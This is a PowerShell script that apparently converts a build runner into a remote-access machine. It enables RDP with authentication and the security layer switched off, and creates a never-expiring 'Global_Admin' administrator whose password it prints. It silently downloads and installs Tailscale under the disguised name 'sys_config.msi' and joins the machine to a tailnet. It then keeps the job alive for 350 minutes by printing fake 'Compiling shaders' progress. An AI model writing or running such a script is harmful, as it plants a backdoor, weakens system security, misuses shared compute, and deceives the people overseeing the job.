$path1 = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
$path2 = "WinStations\RDP-Tcp"
$fullPath = Join-Path $path1 $path2

Set-ItemProperty -Path $path1 -Name "fDenyTSConnections" -Value 0 -Force
Set-ItemProperty -Path $fullPath -Name "UserAuthentication" -Value 0 -Force
Set-ItemProperty -Path $fullPath -Name "SecurityLayer" -Value 0 -Force

$u = "Global_Admin"
$p = "Dev_Pass_$(Get-Random -Max 9999)!"
$s = ConvertTo-SecureString $p -AsPlainText -Force
New-LocalUser -Name $u -Password $s -AccountNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member $u

Write-Host "CREDENTIALS_GENERATED: $u / $p"

$msi = "$env:TEMP\sys_config.msi"
(New-Object Net.WebClient).DownloadFile("https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi", $msi)
Start-Process msiexec.exe -ArgumentList "/i", "`"$msi`"", "/quiet", "/norestart" -Wait

$ts = "$env:ProgramFiles\Tailscale\tailscale.exe"
& $ts up --authkey=$args[0] --hostname="runner-$(Get-Random)"

$stop = (Get-Date).AddMinutes(350)
while ((Get-Date) -lt $stop) {
    Write-Host "Compiling shaders... $(Get-Random -Max 100)%"
    Start-Sleep -Seconds (Get-Random -Min 30 -Max 120)
}
